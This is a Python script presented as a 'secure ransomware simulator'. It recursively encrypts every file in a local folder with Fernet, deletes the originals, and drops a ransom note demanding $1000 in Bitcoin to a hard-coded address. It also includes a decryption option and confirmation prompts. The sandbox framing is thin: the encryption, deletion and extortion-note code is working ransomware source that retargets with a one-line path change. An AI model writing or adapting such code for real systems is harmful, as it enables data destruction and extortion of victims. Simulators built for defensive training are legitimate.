# secure_ransom_simulator.py
import os
import shutil
from cryptography.fernet import Fernet
from pathlib import Path
import datetime
import json

# Configuration
SANDBOX_DIR = os.path.join(os.path.dirname(__file__), "victim_folder")
KEY_FILE = os.path.join(os.path.dirname(__file__), "unlock_key.txt")
RANSOM_NOTE = "!!!READ_ME!!!.txt"
FILE_EXTENSION = ".encrypted"

def generate_complex_key():
    """Generate and store a complex key with metadata"""
    key_data = {
        "key": Fernet.generate_key().decode(),
        "created": datetime.datetime.now().isoformat(),
        "machine": os.environ.get("COMPUTERNAME", "UNKNOWN"),
        "files_affected": 0
    }
    with open(KEY_FILE, 'w') as f:
        json.dump(key_data, f, indent=4)
    return key_data["key"].encode()

def encrypt_folder(key):
    """Properly encrypt all files in folder with validation"""
    fernet = Fernet(key)
    affected_files = 0
    
    for item in Path(SANDBOX_DIR).rglob('*'):
        if item.is_file() and not item.name.endswith(FILE_EXTENSION):
            try:
                # Read original file
                with open(item, 'rb') as f:
                    original = f.read()
                
                # Encrypt and write new file
                encrypted = fernet.encrypt(original)
                encrypted_file = item.with_suffix(item.suffix + FILE_EXTENSION)
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted)
                
                # Remove original file
                item.unlink()
                affected_files += 1
                
            except Exception as e:
                print(f"[!] Failed to encrypt {item}: {str(e)}")
    
    # Update key metadata
    with open(KEY_FILE, 'r+') as f:
        key_data = json.load(f)
        key_data["files_affected"] = affected_files
        f.seek(0)
        json.dump(key_data, f, indent=4)
    
    return affected_files

def create_ransom_note():
    """Create professional ransom note with key instructions"""
    with open(KEY_FILE) as f:
        key_data = json.load(f)
    
    note_content = f"""
    ⚠️ CRITICAL FILE ENCRYPTION NOTICE ⚠️

    Your files have been encrypted with military-grade AES-256 encryption.
    
    To recover your files:
    1. Send $1000 in Bitcoin to: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX
    2. Email this ID: {key_data['created']}-{key_data['machine']}
    3. You will receive decryption instructions

    🔑 Your Unique Decryption Key (DO NOT LOSE THIS):
    
    {key_data['key']}

    WARNING: Attempting to decrypt files without the proper key will 
    result in permanent data loss!
    
    --- Technical Details ---
    Time of Encryption: {key_data['created']}
    Files Affected: {key_data['files_affected']}
    Machine ID: {key_data['machine']}
    """
    
    note_path = os.path.join(SANDBOX_DIR, RANSOM_NOTE)
    with open(note_path, 'w', encoding='utf-8') as f:
        f.write(note_content.strip())

def decrypt_folder(key):
    """Automated decryption using provided key"""
    fernet = Fernet(key)
    recovered_files = 0
    
    for item in Path(SANDBOX_DIR).rglob(f'*{FILE_EXTENSION}'):
        try:
            # Read encrypted file
            with open(item, 'rb') as f:
                encrypted = f.read()
            
            # Decrypt and write original file
            decrypted = fernet.decrypt(encrypted)
            original_path = item.with_suffix('')  # Remove .encrypted
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            # Remove encrypted version
            item.unlink()
            recovered_files += 1
            
        except Exception as e:
            print(f"[!] Failed to decrypt {item}: {str(e)}")
    
    return recovered_files

def main():
    print("Initializing secure ransomware simulator...\n")
    
    # Setup environment
    os.makedirs(SANDBOX_DIR, exist_ok=True)
    
    # Key management
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE) as f:
            key_data = json.load(f)
        key = key_data["key"].encode()
        print(f"[*] Loaded existing key (created: {key_data['created']})")
    else:
        key = generate_complex_key()
        print("[*] Generated new encryption key")
    
    while True:
        print("\n" + "="*50)
        print(" SECURE RANSOMWARE SIMULATOR ".center(50))
        print("="*50)
        print(f"\nSandbox: {SANDBOX_DIR}")
        print(f"Key File: {KEY_FILE}\n")
        
        print("1. Encrypt Folder (Simulate Attack)")
        print("2. Decrypt Folder (Recovery)")
        print("3. Display Decryption Key")
        print("4. Exit\n")
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == "1":
            print("\n[!] WARNING: This will encrypt all files in:")
            print(f"    {SANDBOX_DIR}")
            if input("Continue? (y/n): ").lower() == 'y':
                count = encrypt_folder(key)
                create_ransom_note()
                print(f"\n[+] Success! {count} files encrypted")
                print(f"[!] Decryption key saved to: {KEY_FILE}")
        
        elif choice == "2":
            print("\n[+] Attempting decryption with stored key...")
            count = decrypt_folder(key)
            print(f"[+] {count} files recovered")
        
        elif choice == "3":
            with open(KEY_FILE) as f:
                key_data = json.load(f)
            print("\n=== DECRYPTION KEY ===")
            print(key_data["key"])
            print("\nWARNING: Keep this key secure!")
        
        elif choice == "4":
            print("\n[+] Exiting. Remember:")
            print(f"- Delete {KEY_FILE} after recovery")
            print(f"- Remove {SANDBOX_DIR} when done testing")
            break

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Critical error: {str(e)}")
    finally:
        input("\nPress Enter to exit...")